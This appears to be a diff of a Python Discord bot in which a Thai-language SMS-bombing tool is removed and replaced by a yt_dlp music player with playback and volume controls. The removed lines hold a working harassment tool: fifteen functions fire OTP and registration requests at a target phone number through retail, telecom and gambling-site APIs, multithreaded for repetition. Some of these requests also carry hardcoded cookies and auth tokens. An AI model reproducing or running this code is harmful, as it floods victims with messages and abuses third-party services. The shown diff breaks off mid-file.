@@ -1,250 +1,954 @@
-import time
-import threading
 import discord
-from discord.interactions import Interaction
-import requests
+from discord import app_commands
+from discord.ext import commands, tasks
+from discord.ui import Button, View
+import yt_dlp
+import asyncio
+from datetime import datetime, timezone
 import random
-from bs4 import BeautifulSoup as bs
-import json
-import os
-from discord.ui import Button, View, Modal
-from concurrent.futures import ThreadPoolExecutor
-from discord import app_commands, ui
+import time
 
-####################################################################
-# ส่วนนี้สำหรับตั้งค่าบอทก่อนรันนะครับ
-token = "" # โทเค็นบอท
-server = "1513933011853512835" # <--- ไอดีเซิร์ฟเวอร์ของเรา
-spam_max = 100 # <--- จำนวนการยิงเบอร์สูงสุด
-title_ui = "บริการยิงเบอร์ | แมวส้มชาว" # <--- ชื่อ Title ในที่กรอกเบอร์และจำนวน (Modal)
-des = '"เป็นแค่การทดสอบเท่านั้น"'  # ข้อความอธิบายในส่วนของ Embed
-label = "Click Me!" # ชื่อปุ่มกดยิงเบอร์
-url = "https://cdn.discordapp.com/attachments/1513913711650144316/1513917209653547291/laptop-hacking.gif?ex=6a2978c6&is=6a282746&hm=bec90d558f52c59e2a6b12b8f44c6f4180f453d04115805bdb1e0e39fdd90358&" # <--- Url รูปภาพ
-####################################################################
+intents = discord.Intents.all()
+bot = commands.Bot(command_prefix='/', intents=intents, help_command=None)
 
-threading = ThreadPoolExecutor(max_workers=int(100000))
+queues = {}
+now_playing = {}
+control_messages = {}
+start_times = {}
 
-def api1(target):
-	try:
-		r = requests.post("https://ocs-prod-api.makroclick.com/next-ocs-member/user/register",json={"username": target,"password":"6302814184624az","name":target,"provinceCode":"28","districtCode":"393","subdistrictCode":"3494","zipcode":"40260","siebelCustomerTypeId":"710","acceptTermAndCondition":"true","hasSeenConsent":"false","locale":"th_TH"})
-	except:
-		pass
-		
-def api2(target):
-	try:
-		response2 = requests.post("https://api2.1112.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": target,"language": "th"})
-	except:
-		pass
-		
-def api3(target):
-	try:
-		requests.post("https://api.1112delivery.com/api/v1/otp/create",headers={"User-Agent": "Mozilla/5.0 (Linux; Android 8.1.0; SM-G610F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.40 Mobile Safari/537.36","Content-Type": "application/json"},json={"phonenumber": target,"language": "th"})
-	except:
-		pass
+COLORS = {
+    'primary': 0x7289DA,
+    'success': 0x43B581,
+    'warning': 0xFAA61A,
+    'danger': 0xF04747,
+    'info': 0x00D9FF,
+    'purple': 0x9B59B6,
+    'gold': 0xFFD700,
+    'pink': 0xFF69B4,
+    'cyan': 0x00FFFF,
+}
 
-def api4(target):
-	try:
-		headers = {"accept": "application/json, text/plain, */*","content-type": "application/x-www-form-urlencoded; charset=UTF-8"}
-		requests.post("https://api.ypkshop.com/TOH5jkk3N031INbUepb-2SZCYIj5XGQr_xd-aSSd74s~",headers=headers,data=f"prefix=66&mobile={target}&type=1")
-	except:
-		pass
-		
-def api5(target):
-	headers = {
-		"Host": "shopgenix.com",
-		"content-type": "application/x-www-form-urlencoded",
-		"user-agent": "okhttp/3.14.9"
-	}
-	try:
-		requests.post("https://shopgenix.com/api/sms/otp/",headers=headers,data=f"mobile_country_id=1&mobile={target}")
-	except:
-		pass
-		
-def api6(target):
-	try:
-		response = requests.post("https://api.starzth.com/v2/token",headers={"Authorization": "Basic c2hvcDE3ODFBUEk6TVlWQmtkI2cyJmEyWSMzQGM="})
-		token = response.json()['token']
-		headers = {
-			"authorization": "Bearer " + token,
-			"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36"
-		}
-		requests.post("https://api.starzth.com/homeshopping/v2/register/request",headers=headers,json={"username":target,"name_th":"jsjss","lastname_th":"nxnxnx","password":"as257400A","birthday":"1982-08-08","sex":"M","telephone":f"+66{target[1:]}"})
-	except:
-		pass
-		
-def api7(target):
-	try:
-		requests.post("https://openapi.bigc.co.th/customer/v1/otp", json={"phone_no":f"{target}"})
-	except:
-		pass
-		
-def api8(target):
-	try:
-		requests.post("https://api-sso.ch3plus.com/user/request-otp", json={"tel":f"{target}","type":"login"})
-	except:
-		pass
-		
-def api9(target):
-	try:
-		requests.post("https://topping.truemoveh.com/api/get_request_otp", data=f"mobile_number={target}",headers={
-	    "Accept": "application/json, text/plain, /",
-	    "User-Agent": "Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.74 Mobile Safari/537.36",
-	    "Content-Type": "application/x-www-form-urlencoded",
-	    "Referer": "https://topping.truemoveh.com/otp?callback=/campaign/104",
-	    "Cookie": "_ga=GA1.2.1205060554.1640098569; _gcl_au=1.1.1987856152.1640098570; wisepops=%7B%22csd%22%3A1%2C%22popups%22%3A%7B%7D%2C%22sub%22%3A0%2C%22ucrn%22%3A57%2C%22cid%22%3A%2237257%22%2C%22v%22%3A4%2C%22bandit%22%3A%7B%22recos%22%3A%7B%7D%7D%7D; wisepops_props=%7B%22userType%22%3A%22non-true%22%7D; _fbp=fb.1.1640098573194.360235747; wisp-https%3A%2F%2Fapp.getwisp.co-Ly7y=88ce9a24-a734-4ee0-a698-20f8eddb4942; _gac_UA-34289891-14=1.1640601367.Cj0KCQiA5aWOBhDMARIsAIXLlkfb9M64-nkR8u0vdLiqqAhHzV1TK-wuYhvA4nvc76GLMd_LvbDYizMaAruSEALw_wcB; ci_session=dbskqg6a8lqknf9n1cep0jb5vrrhkqdi; AWSELB=87C963610CC5C30592B0F71CAEE836AADF65AFF7868D84BE668BFDE38423D810F8497FAC88813163C52320060AF1A0D59D6D0AECF99D0389471FA83C1B90863201109E903015CCAF2CCBA3F11A5EDD799554400EE1; _gid=GA1.2.1638141276.1641466031; _gac_UA-41231050-25=1.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat=1; _gcl_aw=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gcl_dc=GCL.1641466031.Cj0KCQiAw9qOBhC-ARIsAG-rdn5KaPC2N06d1nss7arDQn6S0_lOmvX71l8LKwV__iZpWisXEem-EP8aAjF2EALw_wcB; _gat_UA-41231050-25=1; wisepops_visits=%5B%222022-01-06T10%3A47%3A11.626Z%22%2C%222022-01-04T16%3A54%3A03.887Z%22%2C%222021-12-28T10%3A38%3A18.612Z%22%2C%222021-12-28T10%3A38%3A04.394Z%22%2C%222021-12-28T10%3A37%3A40.387Z%22%2C%222021-12-27T03%3A47%3A11.187Z%22%2C%222021-12-25T12%3A27%3A55.196Z%22%2C%222021-12-23T17%3A48%3A39.146Z%22%2C%222021-12-21T17%3A56%3A55.678Z%22%2C%222021-12-21T15%3A06%3A46.971Z%22%5D; wisepops_session=%7B%22arrivalOnSite%22%3A%222022-01-06T10%3A47%3A11.626Z%22%2C%22mtime%22%3A1641466036863%2C%22pageviews%22%3A2%2C%22popups%22%3A%7B%7D%2C%22bars%22%3A%7B%7D%2C%22countdowns%22%3A%7B%7D%2C%22src%22%3A%22https%3A%2F%2Fwww.google.com%2F%22%2C%22utm%22%3A%7B%22gclid%22%3A%22yes%22%7D%2C%22testIp%22%3Anull%7D"})
-	except:
-		pass
-		
-def api10(target):
-	try:
-		requests.post("https://www.konvy.com/ajax/system.php?action=get_phone_code",data=f"type=reg&phone={target}&platform=1",headers={"accept": "application/json, text/plain, text/html, text/xml, text/javascript ,image/webp, */*","content-type": "application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","cookie": "f34c_lang2=th_TH;_gcl_au=1.1.772736218.1693663780;_tt_enable_cookie=1;_ttp=dNuShIuyOWBlc6c6_g0VW_C-1ma;k_privacy_state=true;_fbp=fb.1.1693663782140.1359249614;_gid=GA1.2.496014264.1694796867;_gat_UA-28072727-2=1;PHPSESSID=rjuo4ifo49s0d04ekrk5h6bd28;_ga=GA1.1.1256061802.1693663783;_ga_Z9S47GV47R=GS1.1.1694796867.2.1.1694796880.47.0.0;cto_bundle=03x9gV9aSGdNUVFwNUd4Y0RkUzNKZkl2aiUyQlRHNDlzbURwMVdXNDlxc1dMUHM0UXk0c0hId3dFMXhodXAySTV0TjJDSEFQSU9FUmo3Zm1idHYxZldLV3ZQTUdpMThmeUtGbGROJTJGRUxmTGJpZm00ZloyVzFEdFFFeFZCZUVrdWZlT1pEUUhYck9pRUpseGMlMkJVejdON3JVaHoyRlElM0Qb0"})
-	except:
-		pass
-		
-def api11(target):
-	headers = {
-		"content-type": "application/json; charset=utf-8",
-		"authorization": "Bearer eyJ0eXAiOiJKV1QiLCJlbmMiOiJBMTI4Q0JDLUhTMjU2IiwiYWxnIjoiZGlyIn0..L4_HNTppIThHoII_MTndvA.7f_dO0lW5BKDf0AOw9QyinAURihBdvue6G0Xkb18_UXwbM_FxAtk4gknM8kQwSX7Rhfg188UFI73nB8CNu-YPgP-il9Q-4W53yuXC3HQPnBIvGkkFAhZ2JuE8piw0fkGaOGGRvOkhpHNEdaE6jYbRg.IkvgAosR8q6-gZIQANsaqA",
-		"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36",
-		"cookie": "_vwo_uuid_v2=DEED3E33BAB6E6FD264940A38AE9770A3|f4d3bf084f98482cfae4d65b7fba48d7;_gcl_au=1.1.102477073.1693664216;__rtbh.lid=%7B%22eventType%22%3A%22lid%22%2C%22id%22%3A%22XzVm9LWMCkhD9kjex4AI%22%7D;__lt__cid=ddc5d79b-b37c-47dd-b6e1-f19aedffcd71;__lt__sid=4a20fa5e-1bc444d4;_gid=GA1.2.387552209.1693664218;_gat_UA-12345-6=1;_hjSessionUser_1027858=eyJpZCI6IjJmYTEwNTdkLWExNjYtNWQzMS05OWE3LTczZjU5MTM0NjRkZSIsImNyZWF0ZWQiOjE2OTM2NjQyMTkyODQsImV4aXN0aW5nIjpmYWxzZX0=;_hjFirstSeen=1;_hjIncludedInSessionSample_1027858=0;_hjSession_1027858=eyJpZCI6IjY4NTZiMTIxLWM5NzAtNDEyZS1iNWVmLTM1ODhhMGNmNmFjZCIsImNyZWF0ZWQiOjE2OTM2NjQyMTkzMDUsImluU2FtcGxlIjpmYWxzZX0=;_hjAbsoluteSessionInProgress=0;_fbp=fb.1.1693664219891.541560784;_tt_enable_cookie=1;_ttp=iIHPi-I_pJMyjSs4jgyO6N1YFcJ;_ga=GA1.2.1790770154.1693664218;cto_bundle=GcneO19nQnBDU1lxRzRzZ05BUFQ3bndkU3VDb2MxcHZkaiUyQnMlMkZzdzQzSEgxd0R3a3Y5aVIyOXBsTVg4S0poSmt3YiUyRkV3aTF3Z3NuVFYyREt2WDF5bUlMdjl2TG9rQlNlejdBUEIyZTRBTiUyRm9QcktTT3lyM3ElMkY3VENUcUxUYjVHRjVQVnBXZWE2bmF2eHQlMkI5YUxNNjJ0WWpRc1ElM0QlM0Q;_ga_QEVF0JHYKM=GS1.1.1693664218.1.1.1693664222.56.0.0;ajs_anonymous_id=4314c63d-9cc9-4477-a8e9-77bcb52a8800"
-	}
-	try:
-		requests.get(f"https://nocnoc.com/authentication-service/user/OTP/verify-phone/%2B66{target[1:]}?lang=th&userType=BUYER&locale=th&orgIdfier=scg&phone=%2B66{target[1:]}&phoneCountryCode=%2B66&b-uid=1.0.835")
-	except:
-		pass
-		
-def api12(target):
-	try:
-		requests.post("https://login.s-momclub.com/accounts.otp.sendCode",data=f"phoneNumber=%2B66{target[1:]}&lang=th&APIKey=3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC&source=showScreenSet&sdk=js_latest&authMode=cookie&pageURL=https%3A%2F%2Fwww.s-momclub.com%2Fprofile%2Fregister%3Frefcode%3D202308-SEM-Web-CON_Sitelink%26utm_source%3Dgoogle%26utm_medium%3Dcpa%26utm_campaign%3Dweb-con_sitelink%26gclid%3DCj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB&sdkBuild=15170&format=json",headers={"user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36","content-type" :"application/x-www-form-urlencoded","cookie": "_gcl_au=1.1.1632048683.1693716117;_gid=GA1.2.340423765.1693716117;_fbp=fb.1.1693716117240.325276938;_tt_enable_cookie=1;_ttp=se6fwL-mYqvtITeaMxUztaCZIU_;gmid=gmid.ver4.AcbHIDVFLA.Tn8z5RwuG5o_CNr7jK6qpVxncdn8zkkU7z55uuDdWjUFfGytJe6v2dDbny3V-zOa.jQN8PgyFAldrI1mtG3ZPz3w4iwhOd5D8GHvb6Ohw-LtWWiJ1HWpCWK9-e1oTFfv5TuY8xZPxPcOyPsItrp69Rg.sc3;ucid=9tUxT7gIPCn-5LdLHwrSfw;hasGmid=ver4;gig_bootstrap_3_R6NL_0KSx2Jyu7CsoDxVYau1jyOIaPzXKbwpatJ_-GZStVrCHeHNIO3L1CEKVIKC=login_ver4;tfpsi=fc14307e-ab83-49f4-882b-be3243eed87b;_cls_v=e77d3523-cfd8-42dd-9c01-6628062d4acf;_cls_s=f00695fd-aeb5-4b40-8bed-e4594d3d0f4f:0;_gat_UA-62402337-1=1;_gat_rolloutTracker=1;_gat_globalTracker=1;_gcl_aw=GCL.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-62774158-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_gac_UA-27534376-1=1.1693716220.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga=GA1.2.1260858029.1693716117;_gac_UA-62402337-1=1.1693716234.Cj0KCQjwusunBhCYARIsAFBsUP_NSMXFezjuj7pCuSQmoVRfNdLjOrdmtUwn5xKPT8s1Pwt7DXAydRMaAj0YEALw_wcB;_ga_HLYQD0DQEL=GS1.1.1693716117.1.1.1693716233.34.0.0",})
-	except:
-		pass
-		
-def api13(target):
-	try:
-		requests.post("https://api-customer.lotuss.com/clubcard-bff/v1/customers/otp",json={"mobile_phone_no": target},headers={"Content-Type": "application/json"})
-	except:
-		pass
-		
-def api14(target):
-	try:
-		ip = requests.get("https://ipinfo.io/json").json()['ip']
-		requests.post("https://api.ak1688bet.com/member/otp/get",headers={"accept": "application/json, text/plain, */*","content-type": "application/json","authorization": "Bearer null","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36"},json={"phone":target,"ip": ip})
-	except:
-		pass
-		
-def api15(target):
-	try:
-		requests.post("https://ezslot.com/_ajax_/v3/register/request-otp",headers={"accept": "*/*","content-type": "Application/x-www-form-urlencoded","x-requested-with": "XMLHttpRequest","user-agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Mobile Safari/537.36","cookie": "_ga=GA1.1.583971404.1694529114;_fbp=fb.1.1694529117511.408120849;PHPSESSID=dmhs2qcdi028apt62mr1tkcdd5;_ga_WTQ1KN44EC=GS1.1.1694862154.2.0.1694862154.0.0.0"},data=f"phoneNumber={target}")
-	except:
-		pass
+YTDL_OPTIONS = {
+    'format': 'bestaudio/best',
+    'extractaudio': True,
+    'audioformat': 'mp3',
+    'outtmpl': '%(extractor)s-%(id)s-%(title)s.%(ext)s',
+    'restrictfilenames': True,
+    'noplaylist': True,
+    'nocheckcertificate': True,
+    'ignoreerrors': False,
+    'logtostderr': False,
+    'quiet': True,
+    'no_warnings': True,
+    'default_search': 'auto',
+    'source_address': '0.0.0.0',
+}
 
-def startSMS2(phone,count):
-	for _ in range(count):
-		threading.submit(api1, phone)
-		threading.submit(api3, phone)
-		threading.submit(api4, phone)
-		threading.submit(api5, phone)
-		threading.submit(api6, phone)
-		threading.submit(api7, phone)
-		threading.submit(api8, phone)
-		threading.submit(api9, phone)
-		threading.submit(api10, phone)
-		threading.submit(api11, phone)
-		threading.submit(api12, phone)
-		threading.submit(api13, phone)
-		threading.submit(api14, phone)
-		threading.submit(api15, phone)
+FFMPEG_OPTIONS = {
+    'before_options': '-reconnect 1 -reconnect_streamed 1 -reconnect_delay_max 5',
+    'options': '-vn'
+}
 
-# สร้างอินเทนต์ให้อ่านเนื้อหาข้อความในห้องแชทได้ (Message Content Intent)
-intents = discord.Intents.default()
-intents.message_content = True
-intents.guilds = True
+ytdl = yt_dlp.YoutubeDL(YTDL_OPTIONS)
 
-client = discord.Client(intents=intents)
+class YTDLSource(discord.PCMVolumeTransformer):
+    def __init__(self, source, *, data, volume=0.5):
+        super().__init__(source, volume)
+        self.data = data
+        self.title = data.get('title')
+        self.url = data.get('url')
+        self.thumbnail = data.get('thumbnail')
+        self.duration = data.get('duration', 0)
+        self.uploader = data.get('uploader', 'Unknown')
+        self.webpage_url = data.get('webpage_url')
+        self.requester = None
 
-@client.event
+    @classmethod
+    async def from_url(cls, url, *, loop=None, stream=False):
+        loop = loop or asyncio.get_event_loop()
+        data = await loop.run_in_executor(None, lambda: ytdl.extract_info(url, download=not stream))
+        if 'entries' in data:
+            data = data['entries'][0]
+        filename = data['url'] if stream else ytdl.prepare_filename(data)
+        return cls(discord.FFmpegPCMAudio(filename, **FFMPEG_OPTIONS), data=data)
+
+def format_duration(seconds):
+    if not seconds:
+        return "ไม่ทราบ"
+    mins, secs = divmod(int(seconds), 60)
+    hours, mins = divmod(mins, 60)
+    return f"{hours:02d}:{mins:02d}:{secs:02d}" if hours > 0 else f"{mins:02d}:{secs:02d}"
+
+def get_progress_bar(current, total, length=20):
+    if total == 0 or current > total:
+        return "━" * length
+    filled = max(0, min(int(length * current / total), length))
+    if filled == 0:
+        return "○" + "─" * (length - 1)
+    elif filled >= length:
+        return "━" * length
+    return "━" * filled + "○" + "─" * (length - filled - 1)
+
+def create_simple_embed(title, description, color=COLORS['primary'], emoji="`✨`"):
+    embed = discord.Embed(
+        title=f"{emoji} {title}",
+        description=f"> {description}",
+        color=color,
+        timestamp=datetime.now(timezone.utc)
+    )
+    embed.set_footer(text="🎵 Music Bot", icon_url="https://cdn-icons-png.flaticon.com/512/727/727245.png")
+    return embed
+
+def create_now_playing_embed(interaction: discord.Interaction):
+    guild_id = interaction.guild.id
+    if guild_id not in now_playing:
+        return None
+
+    player = now_playing[guild_id]
+    duration = format_duration(player.duration)
+    elapsed = 0
+    
+    if guild_id in start_times and interaction.guild.voice_client and interaction.guild.voice_client.is_playing():
+        elapsed = int(time.time() - start_times[guild_id])
+    
+    elapsed_str = format_duration(elapsed)
+    progress_bar = get_progress_bar(elapsed, player.duration if player.duration else 0)
+
+    vc = interaction.guild.voice_client
+    if vc:
+        if vc.is_playing():
+            status = "กำลังเล่น"
+            status_emoji = "`▶️`"
+            status_color = COLORS['gold']
+        elif vc.is_paused():
+            status = "หยุดชั่วคราว"
+            status_emoji = "`⏸️`"
+            status_color = COLORS['warning']
+        else:
+            status = "หยุด"
+            status_emoji = "`⏹️`"
+            status_color = COLORS['danger']
+    else:
+        status = "ไม่ได้เชื่อมต่อ"
+        status_emoji = "`❌`"
+        status_color = COLORS['danger']
+
+    embed = discord.Embed(
+        title=f"{status_emoji} {status}",
+        color=status_color,
+        timestamp=datetime.now(timezone.utc)
+    )
+
+    embed.add_field(
+        name="`🎵` กำลังเล่น",
+        value=f"**[{player.title}]({player.webpage_url})**",
+        inline=False
+    )
+
+    embed.add_field(
+        name="`⏱️` ความคืบหน้า",
+        value=f"`{elapsed_str}` {progress_bar} `{duration}`",
+        inline=False
+    )
+
+    current_volume = 50
+    if vc and vc.source and hasattr(vc.source, 'volume'):
+        current_volume = int(vc.source.volume * 100)
+
+    volume_emoji = "🔇" if current_volume == 0 else "🔉" if current_volume < 50 else "🔊"
+
+    info_text = f"{volume_emoji} **ระดับเสียง:** `{current_volume}%`\n"
+    info_text += f"`📊` **คิว:** `{len(queues[guild_id]) if guild_id in queues else 0} เพลง`"
+    embed.add_field(name="`⚙️` สถานะ", value=info_text, inline=True)
+
+    song_info = f"`👤` **ช่อง:** {player.uploader}\n"
+    if player.requester:
+        song_info += f"`🎤` **ขอโดย:** {player.requester.mention}"
+    embed.add_field(name="`📝` รายละเอียด", value=song_info, inline=True)
+
+    if player.thumbnail:
+        embed.set_image(url=player.thumbnail)
+
+    embed.set_footer(
+        text="ใช้ปุ่มด้านล่างเพื่อควบคุม",
+        icon_url="https://cdn-icons-png.flaticon.com/512/727/727245.png"
+    )
+
+    return embed
+
+class MusicControlView(View):
+    def __init__(self, interaction: discord.Interaction):
+        super().__init__(timeout=None)
+        self.interaction = interaction
+
+    async def update_now_playing(self):
+        guild_id = self.interaction.guild.id
+        if guild_id in control_messages and guild_id in now_playing:
+            try:
+                embed = create_now_playing_embed(self.interaction)
+                await control_messages[guild_id].edit(embed=embed)
+            except:
+                pass
+
+    @discord.ui.button(emoji="⏸️", label="หยุด", style=discord.ButtonStyle.primary, custom_id="pause")
+    async def pause_button(self, interaction: discord.Interaction, button: Button):
+        vc = interaction.guild.voice_client
+        if vc and vc.is_playing():
+            vc.pause()
+            await self.update_now_playing()
+            embed = create_simple_embed("หยุดชั่วคราว", "หยุดเพลงชั่วคราวแล้ว", COLORS['warning'], "`⏸️`")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+        else:
+            embed = create_simple_embed("ไม่สามารถหยุดได้", "ไม่มีเพลงที่กำลังเล่นอยู่", COLORS['danger'], "`❌`")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    @discord.ui.button(emoji="▶️", label="เล่นต่อ", style=discord.ButtonStyle.success, custom_id="resume")
+    async def resume_button(self, interaction: discord.Interaction, button: Button):
+        vc = interaction.guild.voice_client
+        if vc and vc.is_paused():
+            vc.resume()
+            await self.update_now_playing()
+            embed = create_simple_embed("เล่นต่อ", "เล่นเพลงต่อแล้ว", COLORS['success'], "`▶️`")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+        else:
+            embed = create_simple_embed("ไม่สามารถเล่นต่อได้", "เพลงไม่ได้หยุดอยู่", COLORS['danger'], "`❌`")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    @discord.ui.button(emoji="⏭️", label="ข้าม", style=discord.ButtonStyle.secondary, custom_id="skip")
+    async def skip_button(self, interaction: discord.Interaction, button: Button):
+        vc = interaction.guild.voice_client
+        if vc and vc.is_playing():
+            vc.stop()
+            embed = create_simple_embed("ข้ามเพลง", "ข้ามไปเพลงถัดไปแล้ว", COLORS['info'], "`⏭️`")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+        else:
+            embed = create_simple_embed("ไม่สามารถข้ามได้", "ไม่มีเพลงที่กำลังเล่นอยู่", COLORS['danger'], "`❌`")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    @discord.ui.button(emoji="⏹️", label="หยุดทั้งหมด", style=discord.ButtonStyle.danger, custom_id="stop")
+    async def stop_button(self, interaction: discord.Interaction, button: Button):
+        guild_id = interaction.guild.id
+        queue_count = len(queues[guild_id]) if guild_id in queues else 0
+
+        if guild_id in queues:
+            queues[guild_id].clear()
+
+        vc = interaction.guild.voice_client
+        if vc:
+            vc.stop()
+
+        embed = create_simple_embed(
+            "หยุดการเล่น",
+            f"หยุดเพลงและล้างคิว ({queue_count} เพลง) แล้ว",
+            COLORS['danger'],
+            "`⏹️`"
+        )
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+    @discord.ui.button(emoji="📝", label="คิว", style=discord.ButtonStyle.secondary, custom_id="queue")
+    async def queue_button(self, interaction: discord.Interaction, button: Button):
+        guild_id = interaction.guild.id
+
+        if guild_id not in queues or len(queues[guild_id]) == 0:
+            embed = create_simple_embed("คิวว่าง", "ไม่มีเพลงในคิว", COLORS['info'], "`📭`")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+
+        queue_list = ""
+        for i, song in enumerate(queues[guild_id][:10], 1):
+            queue_list += f"`{i}.` **{song.title}**\n"
+
+        if len(queues[guild_id]) > 10:
+            queue_list += f"\n`✨` *...และอีก {len(queues[guild_id]) - 10} เพลง*"
+
+        embed = discord.Embed(
+            title="`📝` รายการคิว",
+            description=queue_list,
+            color=COLORS['purple'],
+            timestamp=datetime.now(timezone.utc)
+        )
+
+        embed.add_field(
+            name="`📊` สถิติ",
+            value=f"`🎵` **จำนวนเพลง:** `{len(queues[guild_id])}` เพลง",
+            inline=False
+        )
+
+        embed.set_footer(text=f"ดูโดย {interaction.user.display_name}",
+                        icon_url=interaction.user.avatar.url if interaction.user.avatar else None)
+
+        await interaction.response.send_message(embed=embed, ephemeral=True)
+
+class VolumeControlView(View):
+    def __init__(self, interaction: discord.Interaction):
+        super().__init__(timeout=None)
+        self.initial_interaction = interaction
+
+    async def update_volume_display(self, interaction: discord.Interaction, vol):
+        vc = interaction.guild.voice_client
+        if not vc:
+            embed = create_simple_embed("ไม่ได้เชื่อมต่อ", "บอทไม่ได้อยู่ในห้องเสียง", COLORS['danger'], "`❌`")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+
+        if not vc.source or not hasattr(vc.source, 'volume'):
+            embed = create_simple_embed("ไม่สามารถปรับได้", "ไม่มีเพลงที่กำลังเล่นอยู่", COLORS['danger'], "`❌`")
+            await interaction.response.send_message(embed=embed, ephemeral=True)
+            return
+
+        vc.source.volume = vol / 100
+
+        emoji = "🔇" if vol == 0 else "🔉" if vol < 50 else "🔊"
+        bar_length = 20
+        filled = int(bar_length * vol / 100)
+        volume_bar = "█" * filled + "░" * (bar_length - filled)
+
+        embed = discord.Embed(
+            title=f"{emoji} ควบคุมระดับเสียง",
+            description=f"> กำลังปรับระดับเสียงของบอท",
+            color=COLORS['info'],
+            timestamp=datetime.now(timezone.utc)
+        )
+
+        embed.add_field(
+            name="`🎚️` ระดับเสียงปัจจุบัน",
+            value=f"{vol}%\n`{volume_bar}`",
+            inline=False
+        )
+
+        embed.add_field(
+            name="`💡` เคล็ดลับ",
+            value="ใช้ปุ่มด้านล่างเพื่อเปลี่ยนระดับเสียงอย่างรวดเร็ว!",
+            inline=False
+        )
+
+        embed.set_footer(
+            text=f"ปรับโดย {interaction.user.display_name}",
+            icon_url=interaction.user.avatar.url if interaction.user.avatar else None
+        )
+
+        await interaction.response.edit_message(embed=embed)
+
+        guild_id = interaction.guild.id
+        if guild_id in control_messages:
+            try:
+                np_embed = create_now_playing_embed(interaction)
+                await control_messages[guild_id].edit(embed=np_embed)
+            except:
+                pass
+
+    @discord.ui.button(emoji="🔇", label="0%", style=discord.ButtonStyle.secondary)
+    async def vol_0(self, interaction: discord.Interaction, button: Button):
+        await self.update_volume_display(interaction, 0)
+
+    @discord.ui.button(emoji="🔉", label="25%", style=discord.ButtonStyle.primary)
+    async def vol_25(self, interaction: discord.Interaction, button: Button):
+        await self.update_volume_display(interaction, 25)
+
+    @discord.ui.button(emoji="🔉", label="50%", style=discord.ButtonStyle.primary)
+    async def vol_50(self, interaction: discord.Interaction, button: Button):
+        await self.update_volume_display(interaction, 50)
+
+    @discord.ui.button(emoji="🔊", label="75%", style=discord.ButtonStyle.success)
+    async def vol_75(self, interaction: discord.Interaction, button: Button):
+        await self.update_volume_display(interaction, 75)
+
+    @discord.ui.button(emoji="🔊", label="100%", style=discord.ButtonStyle.danger)
+    async def vol_100(self, interaction: discord.Interaction, button: Button):
+        await self.update_volume_display(interaction, 100)
+
+@tasks.loop(seconds=5)
+async def update_now_playing_task():
+    for guild_id, message in list(control_messages.items()):
+        if guild_id in now_playing:
+            try:
+                guild = bot.get_guild(guild_id)
+                if guild and guild.voice_client:
+                    class MockInteraction:
+                        def __init__(self, guild):
+                            self.guild = guild
+                    
+                    interaction = MockInteraction(guild)
+                    embed = create_now_playing_embed(interaction)
+                    if embed:
+                        await message.edit(embed=embed)
+            except:
+                pass
+
+@bot.event
 async def on_ready():
-    print(f'We have logged in as {client.user}')
-    await client.change_presence(activity=discord.Game(name="สั่งงานพิมพ์ !sms [เบอร์] [จำนวน]"))
+    print(f'🎵 {bot.user} พร้อมเล่นเพลงแล้ว!')
+    print(f'📊 เชื่อมต่อกับ {len(bot.guilds)} เซิร์ฟเวอร์')
+    
+    try:
+        synced = await bot.tree.sync()
+        print(f"🔄 ซิงค์ Slash Commands สำเร็จ ({len(synced)} คำสั่ง)")
+    except Exception as e:
+        print(f"❌ ซิงค์คำสั่งล้มเหลว: {e}")
+        
+    if not update_now_playing_task.is_running():
+        update_now_playing_task.start()
+    
+    await bot.change_presence(
+        activity=discord.Activity(
+            type=discord.ActivityType.listening,
+            name="/help ดูคำสั่งบอทเพลง"
+        )
+    )
 
-@client.event
-async def on_message(message):
